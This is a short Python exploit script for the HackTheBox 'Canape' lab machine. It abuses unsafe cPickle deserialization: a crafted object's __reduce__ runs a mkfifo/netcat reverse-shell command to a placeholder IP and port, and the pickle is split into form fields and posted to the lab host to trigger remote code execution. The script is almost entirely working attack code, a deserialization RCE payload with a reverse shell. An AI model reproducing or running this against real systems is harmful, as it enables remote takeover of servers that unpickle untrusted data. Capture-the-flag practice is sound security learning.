'''
HackTheBox Canape cPickle exploit
------------------------------------
This script exploits a vulnerability within 
the cPickle library where it can lead to a 
Remote Code Exucation and system takeover. 
'''


import os
import cPickle
import requests
from hashlib import md5


class name(object):
    def __reduce__(self):
        return (os.system, ('echo homer!;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f',))


character, quote = cPickle.dumps(name()).split("!")
p_id = md5(character + quote).hexdigest()

target = 'http://10.10.10.70/submit'
post = 'http://10.10.10.70/check'

requests.post(target, data={'character' :character, 'quote' :quote})
requests.post(post, data={'id': p_id})
